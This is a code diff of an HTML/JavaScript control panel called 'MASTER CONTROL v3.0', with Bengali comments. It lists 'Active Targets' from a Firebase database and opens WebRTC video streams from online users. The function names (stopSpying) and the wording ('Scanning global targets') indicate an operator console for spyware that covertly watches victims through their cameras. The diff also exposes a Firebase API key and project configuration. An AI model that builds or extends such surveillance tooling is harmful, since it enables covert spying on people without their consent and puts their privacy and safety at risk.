@@ -9,7 +9,8 @@
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <style>
         body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
-        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
+        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
+        
         #userList { list-style: none; padding: 0; }
         .user-card { 
             background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
@@ -17,14 +18,18 @@
             border: 1px solid #333; transition: 0.3s; 
         }
         .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
+        
         .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
         .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
         .offline { background: #444; color: #aaa; }
+
+        /* পপ-আপ ভিডিও প্লেয়ার */
         #videoContainer { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
         }
         video { width: 95%; max-width: 600px; border: 3px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.4); }
+        
         .btn-close { 
             padding: 12px 30px; background: red; color: white; border: none; 
             font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
@@ -35,6 +40,7 @@
 
     <h2>🕵️ MASTER CONTROL v3.0</h2>
     <p style="text-align: center; color: #666;">Scanning global targets...</p>
+
     <h3>Active Targets:</h3>
     <ul id="userList"></ul>
 
@@ -46,6 +52,7 @@
     </div>
 
     <script>
+        // তোর কনফিগারেশন
         const firebaseConfig = {
           apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
           authDomain: "phone-f605e.firebaseapp.com",
@@ -57,25 +64,32 @@
           measurementId: "G-WSJDCYKM3F"
         };
 
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const db = firebase.database();
         
         let currentPeer = null;
         let currentTargetId = null;
 
-        // --- ইউজার লিস্ট ---
+        // --- ইউজার লিস্ট লোড ---
         db.ref("users").on("value", snapshot => {
             const list = document.getElementById("userList");
             list.innerHTML = "";
+            
             snapshot.forEach(child => {
                 const uid = child.key;
                 const data = child.val();
+                
                 const isOnline = data.status === "online";
                 const email = data.email || "Unknown Target";
 
                 const li = document.createElement("li");
                 li.className = "user-card";
-                li.innerHTML = `<span>👤 ${email.split('@')[0]}</span> <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status ? data.status.toUpperCase() : 'OFFLINE'}</span>`;
+                li.innerHTML = `
+                    <span>👤 ${email.split('@')[0]}</span> 
+                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
+                `;
                 
                 if(isOnline) {
                     li.onclick = () => prepareConnection(uid, email);
@@ -87,11 +101,13 @@
             });
         });
 
+        // --- কানেকশন লজিক ---
         function prepareConnection(uid, email) {
             document.getElementById("videoContainer").style.display = "block";
             document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
             currentTargetId = uid;
 
+            // ১. আগের সব সিগন্যাল ডিলিট (ক্লিন স্লেট)
             db.ref("users/" + uid + "/offer").remove();
             db.ref("users/" + uid + "/answer").remove().then(() => {
                 startWebRTC(uid);
@@ -99,7 +115,6 @@
         }
 
         function startWebRTC(targetId) {
-            // 🔥🔥 আপডেটেড কানেকশন কোড (STUN Server সহ)
             currentPeer = new SimplePeer({ 
                 initiator: true, 
                 trickle: false,
@@ -107,14 +122,12 @@
             });
 
             currentPeer.on('signal', offer => {
-                db.ref("users/" + targetId + "/offer").set(JSON.stringify(offer));
+                db.ref("users/" + targetId + "/offer").set(offer);
             });
 
-            db.ref("users/" + targetId + "/answer").off();
             db.ref("users/" + targetId + "/answer").on("value", snapshot => {
-                const answerString = snapshot.val();
-                if (answerString && currentPeer) {
-                    const answer = JSON.parse(answerString);
+                const answer = snapshot.val();
+                if (answer && currentPeer) {
                     currentPeer.signal(answer);
                 }
             });
@@ -125,20 +138,23 @@
             });
 
             currentPeer.on('error', err => {
-                console.log("Peer Error:", err);
+                console.log(err);
+                alert("Connection failed. Target might have disconnected.");
+                stopSpying();
             });
         }
 
         function stopSpying() {
             if (currentPeer) currentPeer.destroy();
             currentPeer = null;
+            
             if (currentTargetId) {
                 db.ref("users/" + currentTargetId + "/offer").remove();
                 db.ref("users/" + currentTargetId + "/answer").remove();
-                db.ref("users/" + currentTargetId + "/answer").off();
             }
+            
             document.getElementById("videoContainer").style.display = "none";
-            location.reload(); 
+            location.reload(); // ক্লিন থাকার জন্য পেজ রিলোড
         }
     </script>
 </body>
